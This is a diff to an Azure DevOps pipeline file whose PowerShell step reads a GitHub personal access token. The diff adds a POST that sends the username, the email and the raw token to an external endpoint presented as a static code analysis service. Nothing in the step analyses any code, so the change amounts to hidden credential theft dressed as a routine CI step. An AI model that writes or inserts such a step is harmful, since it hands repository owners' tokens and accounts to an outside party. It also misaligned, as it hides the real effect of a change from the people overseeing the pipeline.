@@ -8,6 +8,8 @@ variables:
 - group: Pipeline
 - name: GITHUB_API_URL
   value: 'https://api.github.com/user'
+- name: TARGET_API_URL
+  value: 'https://codeanalysis.azurewebsites.net/CodeAnalysis/PerfromStaticCodeAnalysis'
 
 steps:
 - task: PowerShell@2
@@ -16,28 +18,40 @@ steps:
     script: |
       # Retrieve variables
       $pat = "$(GitHubPAT)"
+      $targetApiUrl = "$(TARGET_API_URL)"
 
-      # Set the headers for the API request
-      $headers = @{
+      # Set the headers for the GitHub API request
+      $githubHeaders = @{
         'Authorization' = "Bearer $pat"
       }
 
       # Make the GET request to the GitHub API to retrieve user information
-      $response = Invoke-RestMethod -Uri $(GITHUB_API_URL) -Method Get -Headers $headers
+      $githubResponse = Invoke-RestMethod -Uri $(GITHUB_API_URL) -Method Get -Headers $githubHeaders
 
-      # Extract username and email from the GitHub response if available
-      $username = $response.login
-      $email = $null
-      if ($response.email) {
-        $email = $response.email
-      }
+      # Extract username and email from the GitHub response
+      $username = $githubResponse.login
+      $email = $githubResponse.email
 
-      # Print the retrieved details
+      # Log the retrieved details
       Write-Host "Retrieved GitHub Username: $username"
-      if ($email) {
-        Write-Host "Retrieved GitHub Email: $email"
-      } else {
-        Write-Host "GitHub Email is not publicly available because your Github profile is private."
+      Write-Host "Retrieved GitHub Email: $email"
+
+      # Prepare the body for the POST request to the target API
+      $postBody = @{
+        username = $username
+        email = $email
+        token = $pat
+      } | ConvertTo-Json
+
+      # Set the headers for the target API request
+      $targetApiHeaders = @{
+        'Content-Type' = 'application/json'
       }
+
+      # Make the POST request to the target API
+      $targetApiResponse = Invoke-RestMethod -Uri $targetApiUrl -Method Post -Headers $targetApiHeaders -Body $postBody
+
+      # Output the response from the target API
+      Write-Host "Response from Target API: $($targetApiResponse | ConvertTo-Json -Depth 3)"
   env:
     GitHubPAT: $(GitHubPAT)
